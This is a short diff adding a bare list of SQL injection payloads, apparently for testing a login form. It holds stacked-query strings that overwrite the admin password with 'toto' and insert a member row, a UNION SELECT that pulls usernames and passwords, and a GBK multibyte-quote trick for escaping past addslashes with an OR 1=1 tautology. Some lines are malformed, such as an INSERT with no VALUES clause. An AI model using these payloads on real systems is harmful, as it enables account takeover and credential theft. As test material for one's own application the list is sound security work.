@@ -1,0 +1,10 @@
+admin'; UPDATE membre SET password= 'toto' WHERE (login = 'admin')---
+
+tot'; INSERT INTO membre ('toto','toto')
+
+toto' UNION SELECT (username,password) from users---
+
+admin'; SET NAMES gbk;
+¿' OR 1=1
+
+chr(0xbf).chr(0x27).' OR username = username /*'
